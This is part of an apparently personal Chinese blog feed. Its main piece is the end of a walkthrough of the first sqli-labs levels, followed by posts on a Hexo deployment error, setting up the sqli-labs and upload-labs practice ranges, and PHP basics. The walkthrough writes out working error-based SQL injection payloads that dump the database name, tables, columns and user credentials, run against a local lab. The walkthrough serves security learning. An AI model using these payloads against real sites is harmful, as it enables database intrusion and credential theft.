src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/a442969c22e546bcb4de182b451511fb.png" alt="a442969c22e546bcb4de182b451511fb"></p><p>页面报错并且爆出了单括号，根据第三关的经验我们首先测试是不是基于 “) 的注入类型 ，输入注入语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) and 1=1 --+</span><br><span class="line">?id=1&quot;) 1=2 --+</span><br></pre></td></tr></table></figure><p>第一个显示正常，第二个不正常但无报错说明有可能是基于 “) 的注入类型，接下来我们输入ORDER BY 语句进行测试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3 --+</span><br></pre></td></tr></table></figure><p>页面显示正常。。<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/bc6ba356af0f40cb9c807af291f8c9f8.png" alt="bc6ba356af0f40cb9c807af291f8c9f8"></p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>判断为字符注入，通过 ‘ 闭合查询无返回的数据，无论是有数据返回还是无数据返回页面都不会显示相关的数据。</p><p>所以这关的重点是盲注。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=-1&#x27;  %23</span><br></pre></td></tr></table></figure><p><strong>开始注入</strong></p><p>​    <strong>1.双查询注入</strong>(需要多点几下才能出效果)</p><p> <strong>爆库名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select database()), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/9a3f71c5fcf540ffbe4b7e94d7998f81.png" alt="9a3f71c5fcf540ffbe4b7e94d7998f81"></p><p> <strong>爆表名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/04fa7aee6738498a91df6a16e267265d.png" alt="04fa7aee6738498a91df6a16e267265d"></p><p><strong>爆列名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/75ca52a0302c4955a19a3d97bbd6b99c.png" alt="75ca52a0302c4955a19a3d97bbd6b99c"></p><p><strong>爆字段内容（获取用户表的账号和密码）</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select concat(username,&#x27;~&#x27;,password) from users  limit 0,1), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/5e3f5be531ef42389799d5c690d02801.png" alt="5e3f5be531ef42389799d5c690d02801"></p><p>其他账号密码更改limit后面的0为1，2，3，4就可以出来了。</p>]]></content>
    
    
    <summary type="html">sqli-labs前五关</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>解决博客Spawn failed</title>
    <link href="https://dabai5269.top/post/83dcefb7.html"/>
    <id>https://dabai5269.top/post/83dcefb7.html</id>
    <published>2023-02-21T14:03:52.000Z</published>
    <updated>2023-02-22T11:49:05.099Z</updated>
    
    <content type="html"><![CDATA[<p>错误如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: Spawn failed</span><br><span class="line">      at ChildProcess.&lt;anonymous&gt; (/usr/local/src/hexo/hanyubolg/node_modules/hexo-util/lib/spawn.js:51:21)</span><br><span class="line">      at ChildProcess.emit (events.js:376:20)</span><br><span class="line">      at Process.ChildProcess._handle.onexit (internal/child_process.js:277:12) &#123;</span><br><span class="line">    code: 128</span><br><span class="line">  &#125;</span><br><span class="line">&#125; Something&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br></pre></td></tr></table></figure><p>解决方法</p><p>有可能是你的git repo配置地址不正确,可以将http方式变更为ssh方式，如图</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230222194656561.png" alt="image-20230222194656561"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: &#x27;git&#x27; # 这是固定的</span><br><span class="line">  repository:  #这里是你的仓库的地址，根据你自己实际的地址，进行添加</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>如果更改过一次，再更改一次即可。</p>]]></content>
    
    
    <summary type="html">博客部署Spawn failed</summary>
    
    
    
    
    <category term="Spawn failed" scheme="https://dabai5269.top/tags/Spawn-failed/"/>
    
  </entry>
  
  <entry>
    <title>搭建靶场</title>
    <link href="https://dabai5269.top/post/5f593b8b.html"/>
    <id>https://dabai5269.top/post/5f593b8b.html</id>
    <published>2023-02-11T06:16:25.000Z</published>
    <updated>2023-02-13T04:35:44.991Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql-labs靶场环境搭建"><a href="#sql-labs靶场环境搭建" class="headerlink" title="sql-labs靶场环境搭建"></a>sql-labs靶场环境搭建</h1><h2 id="SQLI-LAB下载地址"><a href="#SQLI-LAB下载地址" class="headerlink" title="SQLI-LAB下载地址"></a>SQLI-LAB下载地址</h2><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><h2 id="WEB环境搭建"><a href="#WEB环境搭建" class="headerlink" title="WEB环境搭建"></a>WEB环境搭建</h2><p>在安装靶场之前，我们还需要搭建web运行环境（phpstudy）：<a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p><h2 id="Sql-labs靶场环境搭建"><a href="#Sql-labs靶场环境搭建" class="headerlink" title="Sql-labs靶场环境搭建"></a>Sql-labs靶场环境搭建</h2><p>打开根目录</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20142815.png" alt="屏幕截图 2023-02-11 142815"></p><p>解压到WWW目录</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20142946.png" alt="屏幕截图 2023-02-11 142946"></p><p>在sqli-labs-master找到sqli-connections然后打开db-creds.inc，将$dbpass&#x3D;‘’改为$dbpass&#x3D;‘root’保存<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20143139.png" alt="屏幕截图 2023-02-11 143139"></p><p> 完成后打开phpstudy，启动Apache和Mysql</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20143514.png" alt="屏幕截图 2023-02-11 143514"></p><p>访问：<a href="http://127.0.0.1/sqli-labs-master/%E6%89%93%E5%BC%80%E9%A6%96%E9%A1%B5">http://127.0.0.1/sqli-labs-master/打开首页</a></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20143625.png" alt="屏幕截图 2023-02-11 143625"></p><p>点击Setup&#x2F;reset Database for labs使其自动创建数据库，如图</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/b91c8481328444a7bc8f0423b1e65c3a.png" alt="b91c8481328444a7bc8f0423b1e65c3a"></p><h1 id="Upload-labs靶场的搭建"><a href="#Upload-labs靶场的搭建" class="headerlink" title="Upload-labs靶场的搭建"></a>Upload-labs靶场的搭建</h1><p>下载源码：<a href="https://github.com/Tj1ngwe1/upload-labs">https://github.com/Tj1ngwe1/upload-labs</a></p><p>解压到WWW目录</p><p>访问：<a href="http://127.0.0.1/upload-labs-master/">http://127.0.0.1/upload-labs-master/</a></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20144714.png" alt="屏幕截图 2023-02-11 144714"></p>]]></content>
    
    
    <summary type="html">sql-labs、upload-labs</summary>
    
    
    
    
    <category term="靶场" scheme="https://dabai5269.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>PHP</title>
    <link href="https://dabai5269.top/post/c036635b.html"/>
    <id>https://dabai5269.top/post/c036635b.html</id>
    <published>2023-02-05T07:13:36.000Z</published>
    <updated>2023-02-13T04:37:43.542Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我的第一段 PHP 脚本！&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure><p>PHP 脚本以 <em><?php* 开头，以 *?></em> 结尾：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 此处是 PHP 代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Local-和-Global-作用域"><a href="#Local-和-Global-作用域" class="headerlink" title="Local 和 Global 作用域"></a>Local 和 Global 作用域</h2><p>函数<em>之外</em>声明的变量拥有 Global 作用域，只能在函数以外进行访问。</p><p>函数<em>内部</em>声明的变量拥有 LOCAL 作用域，只能在函数内部进行访问。</p><p>下面的例子测试了带有局部和全局作用域的变量：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-05%20152809.png" alt="屏幕截图 2023-02-05 152809"></p>]]></content>
    
    
    <summary type="html">PHP基础</summary>
    
    
    
    
    <category term="PHP" scheme="https://dabai5269.top/tags/PHP/"/>
    
  </entry>
  
</feed>
